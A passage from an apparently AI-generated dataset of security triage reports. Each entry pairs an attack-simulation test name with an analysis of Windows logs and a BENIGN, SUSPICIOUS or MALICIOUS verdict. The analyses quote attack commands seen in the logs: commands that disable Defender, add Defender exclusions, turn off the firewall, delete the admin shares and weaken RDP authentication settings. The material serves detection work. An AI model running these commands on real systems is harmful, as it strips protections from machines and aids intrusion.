6. **Multiple Sysmon Event IDs (1, 5)**: These indicate process creations and file creations. `wevtutil.exe` appears multiple times, often used for event log manipulation, which is suspicious if conducted without reason.

7. **Kernel General and Time-Service**: Similar to item 1, repeated adjustments could be a cover-up for malicious behavior.

8. **Software and Signature Updates**: There are logs indicating legitimate Microsoft update processes (e.g., Windows Update Client). Observing this amidst other suspicious activities can signify normal patch cycles or masked activity.

Assessment and Guidance:

Based on the evidence available, the presence of PowerShell executions and the peculiar usage of whoami.exe, alongside privilege escalations and time changes, place this activity in the **SUSPICIOUS** category. Further investigation is warranted to clarify the intent behind these actions. It is important to:

- Conduct a root cause analysis to determine the source and intent of the PowerShell commands.
- Review admin actions associated with the `admin_test` account for validity.
- Ensure that no unauthorized changes were made to event logs (via tools like `wevtutil`).
- Monitor network activity to confirm no data exfiltration occurred, particularly from localhost requests.
- Check for signs of lateral movement or further compromises using endpoint monitoring solutions.

Final Resolution: **SUSPICIOUS** - further investigation required to rule out potential compromise."
Disable Administrative Share Creation at Startup,"Upon reviewing the event logs provided, here is a detailed analysis:

### Summary of Logs:

1. **Windows PowerShell Log:**
   - This section is blank, indicating no PowerShell activity captured, which means there's no immediate concern from PowerShell scripting.

2. **System Log:**
   - Events show some modifications related to system time but appear to be regular time synchronization activities. No evidence of abnormal or suspicious process activities here.

3. **Security Log:**
   - **Event ID 4616:** Time change events, likely due to system time sync.
   - **Event ID 4672 & 4624:** Indicates the granting of special privileges to the user `admin_test`. This user is logged in using NTLM authentication from an external workstation `DESKTOP-3HL5B2P`. While enabling many privileges might be a regular admin activity, it's worth noting as such actions should generally be monitored closely due to potential misuse.
   - **Event ID 4634:** Logoff of the user `admin_test`, indicating a session end.

4. **Sysmon Log:**
   - Several processes related to Windows and Microsoft Edge Update activities were executed. Notably:
     - Execution of processes like `wevtutil.exe` and `conhost.exe` by the user `admin_test`. The execution of `wevtutil.exe` can be benign or suspicious based on context as it interacts with Windows Event Logs. However, this requires further inspection.
     - **Events involving cmd.exe:** Show the addition of registry keys related to disabling administrative shares (`AutoShareServer/AutoShareWks`). This change can be typical for some administrative tasks but may also indicate an attempt to reduce the visibility of activities.
   - Execution of registry commands (cmd.exe triggering reg.exe) to manipulate network shares is a potential indicator of malicious behavior—specifically when configured to disable administrative shares.

5. **Application Log:**
   - Shows Edge Update services starting and stopping, likely routine updates. These do not show any immediate cause for concern unless further context reveals abnormal patterns.

### Anomalies and Concerns:

- The execution of registry changes using the command line to modify sharing settings might indicate an attempt to hide suspicious activities or access controls tightly.
- Use of high privilege actions by `admin_test`, such as modifying registry settings and utilizing administrative shares, should be carefully validated.
  
### Threat Assessment:

- **SUSPICIOUS**: The combination of registry modifications via command line and extensive privilege use by `admin_test` warrants further investigation to ensure these actions were intentional and authorized. While these activities can be administrative, they might also align with certain attack vectors, such as lateral movement or evasion tactics.

### Recommendations:
- **Verify the Legitimacy**: Check with system administrators or the user `admin_test` to confirm if these changes were planned and authorized.
- **Review Access Logs**: Monitor any other recent login or network activity related to `admin_test` and workstation `DESKTOP-3HL5B2P` to ensure no unauthorized activities took place.
- **Increase Monitoring**: Set up alerts for similar activities involving command line registry modifications or privilege escalations for better real-time incident response.
- **Conduct a Security Audit**: Ensure that all security policies are updated, particularly around NTLM authentication and the use of administrative shares.

In conclusion, while the actions in the logs could be benign and part of normal administrative tasks, the potential for misuse makes these activities suspicious and deserving of more thorough investigation."
Windows - Timestomp a File,"In the provided logs, several events indicate potentially malicious activity, warranting a closer examination:

### Suspicious Behavior:
1. **PowerShell Activity:**
    - Multiple instances (Event IDs 1091 - 1099, and others) of PowerShell execution with the `import-module` command targeting a script `timestomp.ps1` in a temporary directory. The `timestomp.ps1` is noteworthy because ""Timestomping"" is a tactic commonly associated with persistence and evasion techniques, altering file timestamps to make malicious files appear benign.

2. **Sysmon Logs:**
    - Several Sysmon events capture the execution of `powershell.exe` with the same `timestomp.ps1` module imported (Event Record IDs such as 18008, 18009). This script execution under a user's context (admin_test) with high integrity levels points to potential unauthorized activity.
    - There’s frequent use of `conhost.exe`, often used to run console applications. This in itself is not suspicious but correlates with the PowerShell activities, it may be used as part of persistence mechanisms.
    - The use of `wevtutil.exe`, a legitimate tool to manage event logs, which appears frequently (Event Record IDs like 17982, 17986, 17994) immediately before or after running `powershell.exe`, might indicate an attempt to clear logs or perform log tampering.

3. **Overall Context:**
    - The sequence of PowerShell and process execution occurs within milliseconds of each other, indicating automated scripted activity.
    - There is significant activity involving known legitimate processes like `MicrosoftEdgeUpdate.exe`, which could be normal operations or a cover for malicious operations, but this requires verification due to the context.
  
### Analysis:
Taken together, the PowerShell logs, sysmon logs, and the nature of the PowerShell script being executed strongly suggest malicious activity. The use of PowerShell to run timestomp operations indicates an attempt at forensic evasion or manipulation, a common technique in attacks.

### Recommendation:
- **Immediate Investigation:** Conduct a detailed investigation of the script `timestomp.ps1` and any files in its path to understand its contents and possible impact.
- **Containment:** Isolate the affected system (Server002) to prevent lateral movement within the network.
- **User Verification:** Verify the legitimacy of the `admin_test` user account's activities and any anomalies in its permissions or behavior.
- **Check Additional Indicators:** Scan for other IoCs (Indicators of Compromise) such as unexpected network connections or further script executions.
- **Review and Monitor:** Conduct a comprehensive log review beyond the provided logs, and set up heightened monitoring for similar patterns.

**Resolution: MALICIOUS**
The activity observed in these logs is conclusively indicative of malicious behavior. There is strong evidence of potential timestamp modification for evasion purposes, suggesting compromise and indicating an appropriate response and investigation are urgently needed."
Invoke CHM Shortcut Command with ITS and Help Topic,"### Analysis

Based on the provided logs from the Sysmon, Windows PowerShell, Security, System, and Application channels, there are several entries that warrant analysis to determine their potential threat level.

#### Sysmon Log Analysis

1. **PowerShell Events:**
   - Multiple PowerShell processes are recorded in the logs, initiated by the user `SERVER002\admin_test`. One instance involves a command with `Invoke-ATHCompiledHelp`, which is unusual and could potentially be indicative of an execution of a script possibly from a compiled CHM file. This is not a standard PowerShell operation for a typical user and could indicate script execution with hidden or obfuscated intents.

2. **wevtutil.exe Usage:**
   - There are multiple instances where `wevtutil.exe` (Windows Event Log Utility) and `conhost.exe` as the console host are executed. The `wevtutil.exe` being run several times might indicate attempts to clear or fetch event logs, which could be suspicious depending on context, especially when automated or bulk operations are not the norm for a given server environment.

3. **Commands and Execution Context:**
   - The use of command-line utilities like `whoami.exe` and `hostname.exe` in rapid succession might suggest reconnaissance activities. If these are legitimate administrative activities, they should be validated.

4. **Integrity Level:**
   - Many processes are executed at a high-level integrity context, which is standard for administrative functions but can be concerning if unauthorized.

#### Windows PowerShell Log Analysis

- The PowerShell logs correlate with the Sysmon logs, confirming the use of a potentially suspicious command involving the `Invoke-ATHCompiledHelp`. The command appears to encapsulate operations related to technical document handling, which can be a vector for script execution from CHM files.

#### Security Log Analysis

- Event ID `4624` indicates successful logon events. Event ID `4672` shows special privileges were assigned to the `SYSTEM` user. While expected on a server, any unusual privilege escalation should be scrutinized.

#### System Log and Application Log Analysis

- The system logs show multiple Windows update events, which generally indicate routine updates. No immediate threats or anomalies are associated here without further detailed inspection.

### Conclusion

Among the entries reviewed, the most concerning is the use of PowerShell with unusual script invocation methods which could indicate malicious script activities (possibly injecting or reading from a Help File). The combination of `wevtutil.exe` frequency, PowerShell command complexity, and context suggest further targeted investigation is warranted.

### Resolution

**SUSPICIOUS** - The activities observed in the logs, especially concerning the PowerShell command execution and frequency of wevtutil usage, raise suspicion of potentially malicious behavior. It needs a thorough investigation, including verifying legitimate user activity, further examination of these PowerShell commands, and checking for any correlated indicators of compromise across other endpoints.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the host if feasible to prevent further potential damage or data exfiltration.
   - Conduct a comprehensive review of user `admin_test` activities to establish intent and necessity.
   
2. **Deep-Dive Analysis:**
   - Scrutinize the script involved with `Invoke-ATHCompiledHelp`, including checking file hash, path, and ownership of `Test.chm` if available.
   - Investigate all instances of `wevtutil.exe` to ensure no malicious log tampering is attempted.
   
3. **Long-Term Monitoring:**
   - Implement enhanced monitoring on this server for PowerShell and command-line activities using additional logging and alerting mechanisms.

4. **User Education & Hardening:**
   - Reinforce user education on recognizing phishing and unusual requests.
   - Apply tighter control over script execution policies, especially for PowerShell.

These steps will help in either confirming or ruling out malicious activity and aid in secure operational upkeep."
Uninstall Sysmon,"Upon reviewing the provided log entries from the Application and System logs, the following observations and analyses can be made:

### Application Log Analysis:

1. **Edgeupdate Service Stopped:**
   - There are two entries from the 'edgeupdate' provider indicating that a service was stopped. The edgeupdate service typically relates to the automatic updating of Microsoft Edge or other software that uses the Edge Update service.
   - The stopping of this service alone is not inherently suspicious; it could be due to scheduled maintenance, an update process, normal operation, or server restart procedures.
   
2. **Software Protection Platform Service:**
   - An entry from the 'Microsoft-Windows-Security-SPP' indicates an event related to the Software Protection Platform Service. This is a standard Windows service that handles licensing and activation.
   - The mention of ""RulesEngine"" and a timestamp does not directly indicate malicious activity without further context. 

### System Log Analysis:

1. **Microsoft-Windows-FilterManager:**
   - An event from the 'Microsoft-Windows-FilterManager' provider is logged. This service deals with file system filter drivers, which can be used to monitor and intercept system operations.
   - The entry references ""SysmonDrv"" as the device name. Sysmon is a legitimate Microsoft tool that can provide detailed information about process creations, network connections, and file changes, often used in security monitoring.
   - The presence of a Sysmon driver is generally benign, indicating that system monitoring is in place. No direct indication of compromise is observed here.

### Conclusion:

After a careful review of the log entries presented, there are no direct indicators of malicious activity or anomalies that stand out within the current logs. The activities recorded, such as the stopping of the edge update service and the presence of system protection and monitoring services, appear to be benign and part of regular system operations or maintenance activities.

### Resolution:

**BENIGN** - The logs contain benign activities as analyzed above. However, it is always prudent to maintain ongoing monitoring and assessment to ensure that any potential threats are detected promptly. If any unusual behavior persists or if additional context arises, further investigation may be warranted."
Tamper with Windows Defender ATP PowerShell,"After analyzing the provided Windows event logs, several suspicious activities stand out:

1. **Windows PowerShell Logs:**
   - The PowerShell logs show the execution of commands to disable a series of critical protection features in Windows Defender:
     - `Set-MpPreference -DisableRealtimeMonitoring 1`
     - `Set-MpPreference -DisableBehaviorMonitoring 1`
     - `Set-MpPreference -DisableScriptScanning 1`
     - `Set-MpPreference -DisableBlockAtFirstSeen 1`
   - These commands effectively reduce the security posture of the system, making it more vulnerable to threats. Such actions are commonly associated with attempts to bypass security mechanisms for executing malicious activities undetected.

2. **Application Logs:**
   - Multiple `SECURITY_PRODUCT_STATE_SNOOZED` events for Windows Defender indicate its active protection was temporarily disabled. This aligns with the aforementioned PowerShell commands and further suggests a deliberate attempt to weaken system defenses.

3. **Sysmon Logs:**
   - Presence of processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` executed by a user labeled `admin_test`. While some of these processes could be legitimate, in the context of the other events, their appearance within this timeframe looks more like an administrative account being used to perform potentially malicious activities.

4. **Security and System Logs:**
   - Anomalies related to changes in system time (Events with ID 4616) can sometimes be an indicator of tampering aimed at confusing logging sequences or attempting to bypass time-based security settings.

### Assessment and Resolution:

- **Indicators of Malicious Activity:** The logs show definitive actions to disable security features, which strongly suggests malicious intent. The alignment of PowerShell activity with the Snoozed state of Windows Defender is particularly indicative of a deliberate attempt to create a vulnerability.

- **Threat/Risk Identification:** Disabling Windows Defender significantly reduces protection against malware, opening the system to potential compromise.

- **Guidance:**
  - Immediately investigate the legitimacy of the `admin_test` user account's actions during the specified time.
  - Review any other related threat intelligence information or indicators of compromise (IOCs).
  - Re-enable any disabled protections and perform a comprehensive security audit.
  - Secure or reset credentials for potentially compromised accounts.
  
In conclusion, the resolution for this investigation is **MALICIOUS**. The actions taken on this system align with known tactics used by malicious actors to compromise systems. Immediate response and remediation activities are recommended to restore and ensure the system's security."
Remove Administrative Shares,"## Detailed Analysis of Logs

### Event Logs Analysis

1. **System Log**:
   - The logs show kernel-general and time-service events, indicating time adjustments by `svchost.exe`. This behavior typically corresponds to a system time synchronization process, which is usually legitimate. There is no indication of unauthorized or unusual process execution.

2. **Sysmon Log**:
   - Several processes, including `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and `cmd.exe`, were run by the user `SERVER002\admin_test` within a short period. While these tools can be used for system investigation and management, they can also be utilized by attackers to explore or manipulate the system, especially `cmd.exe` with the command `for %%i in (C$ IPC$ ADMIN$) do net share %%i /delete`. This command attempts to delete common administrative shares, which is suspicious and could indicate an attempt to remove access or hide tracks.
   - Multiple executions of `net.exe` and `net1.exe` to delete shares (`C$`, `IPC$`, `ADMIN$`) were observed. This is highly suspicious as it suggests an intentional attempt to alter network shares that are usually maintained for administrative purposes.

3. **Application Log**:
   - Contains an event from the Software Protection Platform Service, typically related to software licensing checks. No suspicious activity is directly indicated here.

4. **Security Log**:
   - Logs show a time change event (EventID 4616), which matches the system log entries around time adjustments. This action is logged under `LOCAL SERVICE`, which aligns with expected behavior if the system is synchronizing time correctly.

### Assessment

The majority of the logs appear standard except for the Sysmon logs indicating the execution of `cmd.exe` and subsequent `net.exe` and `net1.exe` processes deleting administrative shares. Such actions are unusual in routine operations and raise security concerns. While none of the logs explicitly demonstrate a confirmed attack or compromise, there are signs that justify further investigation.

### Identified Threats and Risks

- The use of `cmd.exe` to remove administrative shares (`C$`, `IPC$`, `ADMIN$`) can be part of an attempt to cover tracks or reduce forensic visibility.
- Execution of ordinary administrative tools in this context, especially by a regular user, could suggest compromised credentials or misuse by an insider.

### Guidance on How to Proceed

1. **Immediate Action**:
   - Investigate the context and intent behind the deletion of administrative shares. Identify who had access to execute such commands and whether these actions were authorized.
   - Review user `SERVER002\admin_test`'s recent activities and permissions to ensure there are no discrepancies.

2. **Further Investigation**:
   - Check for any changes in user access privileges and ensure no unauthorized changes have been made.
   - Audit network and filesystem access logs to trace any other surprising patterns before or after these events.

3. **Preventive Measures**:
   - Strengthen monitoring of critical command-line executions and network changes.
   - Implement tighter access controls and logging to detect unauthorized usage promptly.

### Final Resolution

Given the suspicious behavior identified, particularly the deletion of critical administrative shares without sufficient detail or justification, I classify these logs as **SUSPICIOUS**. Further investigation is needed to determine the nature of these actions and address any potential security risks."
RDP Authentication Level Override,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several key observations were made. These observations will be analyzed to determine if they indicate any suspicious or malicious activity.

#### 1. **Repeated Execution of `wevtutil.exe` and `conhost.exe` by `admin_test`:**
   - The Sysmon logs show a series of processes being executed by the user `SERVER002\admin_test`. The processes `wevtutil.exe` and `conhost.exe` are seen repeatedly.
   - `wevtutil.exe` is a legitimate Windows utility that interacts with event logs, and `conhost.exe` is a console host process. Frequent usage of these tools can be linked to normal administrative activities. 

#### 2. **Execution of `cmd.exe` With Registry Changes:**
   - An execution of `cmd.exe` with the command `reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f` was observed. 
   - This command modifies the Windows registry to potentially lower security settings related to Terminal Services, which could be considered suspicious if not part of intended configuration management.

#### 3. **Execution of Common System Utilities:**
   - Various system utilities such as `hostname.exe` and `whoami.exe` are executed, which fetch details of the computer name and current user respectively. This behavior can be indicative of reconnaissance activity typically performed in intrusions.
   
#### 4. **Time Synchronization Changes:**
   - There are security audit logs showing time rollback (`EventID: 4616`). Time changes can be leveraged by attackers to evade detection mechanisms reliant on time-based logging.

#### 5. **Usage of Administrative Privileges:**
   - Several logs show the use of strong administrative privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) associated with the account `admin_test`, indicating this account has high-level access that could be potentially abused.

#### Threats or Risks Identified:
- **Registry Modification via Command Line:** The registry modification command run with `cmd.exe` is of particular concern as it can affect Terminal Services, a potential security risk if not authorized.
- **Administrative Access and Activity Timing Concerns:** The actions are all being executed by a potentially privileged user (`admin_test`). The appearance of activities such as time adjustments could indicate unauthorized access or even an internal threat.

### Guidance and Resolution:

Given the above analysis, the activities observed contain indicators that warrant further investigation due to:
- The modification of security-related registry keys.
- High-level security privileges used by `admin_test`.
- The sequence and purpose of repetitive executions that could indicate setup for further access or surveillance.

**Resolution: SUSPICIOUS**

Next steps should include:
- Verifying if the use of `admin_test` for the observed operations was expected and authorized.
- Checking for any other unusual network activity or access patterns.
- Conducting a deeper audit on registry settings and determining if similar unauthorized changes have occurred elsewhere.
- Reviewing access logs and possibly interviewing personnel involved with the `admin_test` account to understand intent and legitimacy behind these usages."
Tamper with Windows Defender Evade Scanning -Extension,"Upon analysis of the provided Windows event logs, here are the observations and conclusions:

### System Log:
- **Time Adjustments:** There are multiple ""Kernel-General"" EventID 1 logs indicating minor time adjustments made by the `svchost.exe` process. This could potentially be linked to regular time synchronization operations if interfacing with a time server like `time.windows.com` is standard behavior. However, abrupt and significant changes could suggest tampering attempts.
  
### Application Log:
- **Edge Update Service:** Repeated start and stop of the `edgeupdate` service suggests typical software behavior where services are commencing updates. This, on its own, doesn't raise immediate red flags but merits monitoring depending on change frequency and context.

### Windows PowerShell Log:
- **PowerShell Command:** A command `Add-MpPreference -ExclusionExtension $excludedExts` is noted. This indicates a modification to Windows Defender preferences, adding an exclusion rule specifically for `.exe` files. Such exclusions can potentially be used maliciously to bypass antivirus detection, warranting further inspection of who executed this command and the rationale behind it.
  
### Sysmon Log:
- **Process Execution:** Frequent executions of legitimate system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`) under the admin account `SERVER002\admin_test`. Using these processes isn't inherently malicious, but frequent executions around the same time might imply manual testing or potentially, administrative scripting.
  
- **Edge Update Executions:** Numerous Edge Update executables run with different flags within tight time frames. This could point towards a typical software update deployment but warrants checking if updates were scheduled/unscheduled around that time to rule out unauthorized interference.

### General Comments:
- No overtly malicious signatures or patterns such as rogue processes, suspicious command executions without legitimate software context, or unexpected privilege escalations detected directly within this snapshot of logs provided.

### Recommendations:
1. **Investigate PowerShell Usage:** The usage of `Add-MpPreference` could suggest unapproved security configuration changes.
2. **Log Validations:** Corroborate logs with known software update schedules to rule out any unauthorized execution or updates.
3. **User Audit:** Verify actions under the `SERVER002\admin_test` account given the high frequency of system-level process executions.

### Conclusion:
The log activities show some potentially suspicious actions that would benefit from a deeper investigation, particularly around the PowerShell exclusion command activity. However, there's insufficient evidence of explicit malicious activity. Thus, the assessment is:

**SUSPICIOUS** - Activity requires further investigation to confirm legitimacy and rule out threats."
WMIC Tamper with Windows Defender Evade Scanning Folder,"### Log Analysis:

#### 1. **Overview of Events:**
- **Application Log (Software Protection Platform Service)**: Entries related to Software Protection Platform Service appear typical and do not show any evidence of suspicious behavior.
  
- **Sysmon Log**: Shows several command-line executions and process activities involving administrative user ‘admin_test’ on `Server002`.
  
- **System Log**: Indicates normal time synchronization events related to the Windows Time-Service.
  
- **Security Log**: Auditing logs reflect time changes that were executed by 'LOCAL SERVICE'.

#### 2. **Suspicious Activities:**
- **Process Execution**: Multiple events in the Sysmon logs show frequent use of system utilities:
  - **`wevtutil.exe` and `conhost.exe`**: These are legitimate Windows utilities; however, frequent, successive executions may warrant further scrutiny depending on the context and frequency.
  - **Command-line Execution**: Notable execution `cmd.exe` with command `wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=""file""`: Indicates potential exclusion of a file path in Windows Defender, which could be indicative of an attempt to bypass security settings.

#### 3. **Indicators of Potential Malicious Activity:**
- **Modification of Windows Defender Settings**: The command-line usage involves modifying Windows Defender's settings to add an exclusion path. This behavior is often associated with attempts to impede AV effectiveness, a common tactic in malware deployment.
  
- **User Context**: The operations are executed under a highly privileged account, `SERVER002\admin_test`. The use of administrative permissions to modify Defender settings is a significant red flag.

### Assessment and Recommendations:

#### **Assessment:**
Given the logged command modifying Windows Defender's exclusion path, there exists an indicator of potentially malicious behavior aiming to bypass security measures. Although the logs on their own do not confirm malicious activity, the context of a compromised or unethical user could escalate this further.

#### **Resolution:**
**SUSPICIOUS**

- **Further Investigation Required**: Recommend conducting in-depth analytics on the user behavior and possibly other systems logs for correlations. Check for any other activities by `SERVER002\admin_test` around this timeframe, or history logs for similar actions. Review any files added to exclusion lists and validate their integrity.

#### **Guidance:**
- Conduct a security audit of the `SERVER002` environment.
- Review access controls, specifically regarding the `admin_test` account.
- Confirm whether the executed command was part of any authorized task or script.
- Use endpoint detection and response (EDR) tools to hunt for additional indicators of compromise or lateral movement.
- Cross-reference with threat intelligence for known IOC matches related to the detected log actions."
Disable Microsoft Defender Firewall,"Upon analysis of the Windows event logs provided, several key observations can be made which may indicate suspicious or potential malicious activity:

1. **Time Change Events**:
   - Several logs indicate a change in system time (Event ID 4616 in the Security log). Although this could be due to routine NTP synchronization, frequent or unexpected time changes can be a red flag for an attacker attempting to manipulate time-based security mechanisms such as event logging or Kerberos ticket expiry.

2. **Unauthorized Privilege Use**:
   - The logs show the use of high privileges (Event ID 4672 in the Security log) linked to the `admin_test` account. This includes privileges like `SeDebugPrivilege` which are typically used for debugging and modifying system processes and are often abused in attacks.

3. **Suspicious Process Activity**:
   - Multiple executions of system utilities such as `wevtutil.exe` and `cmd.exe` with high integrity levels are noted, particularly commands like `netsh advfirewall set currentprofile state off` in the Sysmon logs. This command is used to disable the firewall and is highly indicative of malicious intent especially when executed unprompted under high privilege (Event ID 1 for Process Creation).

4. **Network Connections**:
   - The logs show login events with LogonType 3 (network) associated with the `admin_test` account, which might be legitimate or could indicate a lateral movement attempt, especially if coming from unexpected sources.

5. **Common Administrative Tools Use**:
   - Utilities like `whoami.exe`, `hostname.exe`, and various console hosts (`conhost.exe`) are executed under the `admin_test` user, which in isolation could be part of normal diagnostics but could also suggest reconnaissance activity.

6. **Service Modification**:
   - The log for the change in the service start type of ""IKE and AuthIP IPsec Keying Modules"" from demand start to auto start (Event ID 7040 in the System log) without context suggests modification of network services, potentially for persistence or altering service behavior.

### Assessment:
- **SUSPICIOUS**: While none of the logs provide conclusive evidence of malicious activity on their own, several indicators suggest potential unauthorized or risky actions in the system. 
  - Disabling the firewall using a script executed with high privileges, repeated use of administrative tools, unexplained time changes, and changes in service configurations are significant enough to warrant further investigation.

### Recommendations:
- **Investigate the Origin of Commands**: Trace back to see if there are any legitimate administrative tasks that correspond with the execution of these utilities.
- **Review User Account Activity**: Specifically, examine the recent activities of the `admin_test` user account for unusual patterns or unexpected access, and ensure strong passwords and logging for this account.
- **Monitor Time Settings and Synchronizations**: Ensure synchronization with trusted NTP servers and investigate why manual changes might be occurring.
- **Check for Unauthorized Network Access**: Verify the source IP addresses and any external connections associated with the network logon events.
- **Audit Service Configuration Changes**: Determine the legitimacy of changes to system service configurations to rule out persistence mechanisms.

Ultimately, given the nature of these logs, a more comprehensive network and file integrity monitoring should be considered to identify any ongoing threats or rule out false positives."
UACME Bypass Method 39,"Upon reviewing the provided Windows event logs, we can summarize the analysis focusing on potential indicators of malicious or suspicious activity.

### Analysis:

1. **Cmd.exe Execution with Unusual Command Line Arguments:**
   - The logs indicate the execution of `cmd.exe` with a command-line argument directed to `echo` a path that includes `uacme\\39 Akagi64.exe`. The `uacme` is a known tool used for User Account Control (UAC) bypass techniques, particularly `Akagi` which refers to methods/techniques within the UACMe project.
   - EventRecordID ""17970"" indicates a command execution that attempts to confirm the presence of a potentially malicious executable (`Akagi64.exe`) which is often associated with privilege escalation attempts.

2. **High Integrity Level Command Execution:**
   - There are multiple instances where `cmd.exe` and `powershell.exe` are run at a high integrity level by the user `admin_test`. Running these processes at a high level indicates elevated permissions which could be a sign of privilege escalation if these processes were not intended to run by an admin user or without authorization.

3. **Exploration of User Identity via whoami.exe:**
   - The execution of `whoami.exe` in the context of `admin_test` indicates identity information gathering which could be harmless but in conjunction with suspected UAC activity, it could mean the user is attempting to confirm or establish the level of permissions available.

4. **Edge Update Activity:**
   - The logs show frequent activities surrounding different `MicrosoftEdgeUpdate.exe` processes. While updating software is typically normal, the behavior seems to include numerous process executions in a short span of time, some of which involve operations from temporary directories, which is unusual for official updates.
   - These could be normal update processes, but the frequency and rapid succession of these processes suggest the potential for adversaries exploiting update mechanisms for persistence or privilege escalation.

### Threat Assessment:
While Windows Defender status remains on, which is a positive indicator, the combination of running potential UAC bypass tools (`uacme\\39 Akagi64.exe`), gathering system and user information (via `whoami.exe`), and executing several Edge update related processes is sufficiently concerning.

### Resolution:

Based on the observations, the resolution for these logs is **SUSPICIOUS**. The activity patterns around UAC bypass techniques suggest that further investigation is needed to determine whether the activities were legitimately initiated or if they signify a broader compromise attempt. 

### Recommended Actions:

1. **Immediate Investigation:**
   - Verify the presence and origin of `uacme\\39 Akagi64.exe` on the system.
   - Confirm the purpose and authorization of elevated commands and powershell scripts run by `admin_test`.

2. **Enhanced Monitoring & Logging:**
   - Increase the monitoring for similar privileged execution patterns and process creations.
   - Implement more aggressive logging for all instances of process creations with integrity level elevated, particularly those using cmd and powershell.

3. **Conduct a Threat Hunt:**
   - Review historical logs for similar Entity ID or Guid activities.
   - Ensure that the Edge Update related commands are aligned with typical update processes and cross-verify with network update logs.

4. **User Awareness and Training:**
   - Re-educate the user `admin_test` about potential security implications of administrative actions.
   - Implement strict policy on tool usage like `UACMe` in production environments. 

Further investigation will likely uncover the motives behind these events and potentially lead to a definable threat profile or confirm benign intent."
InstallUtil class constructor method call,"Upon analyzing the provided Windows event logs, I have identified several elements to consider:

1. **Time Change Events (Security and System logs):**
   - The Security log shows Event ID 4616, indicating a change in the system time, executed by `svchost.exe`.
   - The time change events recorded in the System log (Event IDs 1 and 24) show that `svchost.exe` had its system time adjusted. This can occur during normal operation, such as time synchronization with an NTP server, but could also be suspicious if done without legitimate reasons.

2. **PowerShell Activity:**
   - The Windows PowerShell logs show several activities involving execution of scripts from a temporary directory. These scripts (`InstallUtilTestHarness.ps1`) seem to be involved in testing or installation routines (Process ID 5924).
   - The nature of the script, `InstallUtilTestHarness.ps1`, includes potentially compiling and executing C# code dynamically which can indicate suspicious behavior if not authorized or recognized as part of normal operations.

3. **Sysmon Logs:**
   - There is frequent execution of processes such as `powershell.exe`, `conhost.exe`, and `csc.exe`. These processes are pointed towards temporary directories which might indicate possible misuse or exploitation.
   - `InstallUtil.exe` is used with the `data.004.dll` file, which suggests an attempt to leverage InstallUtil for executing code from this DLL. This is often seen in post-exploitation steps of an attack where malicious code is attempted to be executed.
   - Many instances of `MicrosoftEdgeUpdate.exe` and related components with differing command-line arguments, which may be indicative of normal update processes but can also be used for malicious payload delivery. 

4. **Application and Security Logs:**
   - Entries involving the `Microsoft-Windows-Security-SPP` service and `EdgeUpdate` service stopping and starting can be part of normal system maintenance or updates, but any unexpected changes should be verified.

### Assessment and Identified Risks:

The components of the logs present some activities that are suspicious:
- The PowerShell operation involving dynamic script execution in temporary folders, accompanied by usage of `InstallUtil.exe`, raises eyebrows as such mechanisms can be employed for malicious intent.
- The regular invocation of `MicrosoftEdgeUpdate.exe` processes raises some suspicion, especially when used extensively with different parameters, as it might be masked anomalistic activity.

### Recommendations:

1. **Immediate Steps:**
   - Review the legitimacy of the `InstallUtilTestHarness.ps1` script and `data.004.dll`. Verify if these components are legitimate parts of your applications.
   - Ensure all PowerShell activities, especially those involving dynamic script execution, are authorized and verified against expected system operations.
   - Confirm whether the system time adjustments were expected and scheduled by an administrator.

2. **Further Investigation:**
   - Perform threat intelligence checks against any DLLs or executable hashes involved, especially those from temporary directories.
   - Cross-reference the process executions recorded by Sysmon and security policies to trace any unauthorized access or deviations from standard operations.

The nature and results of these log activities lead to a conclusion of:

**Resolution:** **SUSPICIOUS** - The logs contain activity that appears abnormal and warrants further investigation to confirm or refute potential compromise."
Allow Executable Through Firewall Located in Non-Standard Location,"After examining the provided logs, here is a detailed analysis:

### System Log:
- There are routine Kernel-General and Time-Service events primarily related to time changes and system process executions (e.g., `svchost.exe`). No indicators of suspicious or malicious activity were found here as such events are typical in the normal operation of a Windows server.

### Application Log:
- The `edgeupdate` service stopped twice, which by itself is not inherently suspicious without additional context. Service stoppage could be part of a legitimate process, especially for update handling systems. However, repeated starting/stopping combined with other suspicious activity could be worth monitoring.

### Windows PowerShell Log:
- There is a potentially concerning sequence involving PowerShell. A command was executed to copy an executable (`fileTest.exe`) to a user's directory and to add a firewall rule to allow it through the firewall. This kind of behavior is typically seen in suspicious or malicious activities to deploy and execute unauthorized tools on a system.

### Sysmon Log:
- There are entries indicating execution of multiple system utilities (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`) by `admin_test`, which could be part of legitimate administrative tasks. However, the PowerShell log involving `fileTest.exe` raises suspicion.
- The `netsh.exe` command was used to add a firewall rule related to `fileTest.exe`, suggesting potential unauthorized network access.
- The presence of `MicrosoftEdgeUpdate` process events is consistent with software updates, but should be analyzed to confirm it is not part of a broader attack tactic utilizing benign processes.

### Assessment:
- **PowerShell Execution & Firewall Rule Creation:** The activities observed in the Windows PowerShell log (copying an executable to a user directory and modifying firewall rules) indicate potentially malicious behavior, particularly if this activity was not authorized or expected by IT.
  
- **Firewall Adjustment:** The use of `netsh` to adjust firewall rules for `fileTest.exe` without clear justification is concerning, suggesting an effort to enable network communication for this unknown executable.

### Resolution:
- **Resolution: MALICIOUS**
  
Given the presence of PowerShell commands to manipulate files and alter firewall settings potentially to allow unauthorized applications to bypass network protections, this activity appears to be clearly malicious. Immediate action should include:
- Investigating the origin and purpose of the `fileTest.exe`.
- Identifying the context and purpose of the PowerShell script execution.
- Checking for any lateral movement or data exfiltration attempts.
- Reviewing system patch levels and security updates, especially relating to Microsoft Edge.
- Considering actions such as isolating the host, conducting a forensic analysis, and reviewing all user accounts, particularly focusing on `admin_test`.

### Guidance:
- Immediately inform relevant IT security and incident response teams to take necessary actions.
- Establish monitoring for similar patterns to quickly detect future instances.
- Educate users and administrators about careful scrutiny of unexpected PowerShell scripts and unauthorized firewall changes."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"Upon reviewing the provided Windows event logs, let's analyze the critical elements for potential indicators of malicious activity:

1. **Sysmon Logs:**
